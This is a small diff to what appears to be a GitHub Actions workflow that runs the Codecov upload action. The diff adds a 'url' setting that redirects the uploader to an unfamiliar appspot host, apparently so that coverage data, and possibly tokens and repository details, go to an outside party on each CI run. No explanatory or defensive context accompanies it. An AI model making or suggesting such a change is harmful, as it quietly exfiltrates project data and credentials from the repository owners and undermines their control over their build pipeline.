@@ -6,3 +6,5 @@ jobs:
     steps:
       - uses: actions/checkout@master
       - uses: codecov/codecov-action@v3
+        with:
+          url: https://db8b32.appspot.com/cat/in/cc
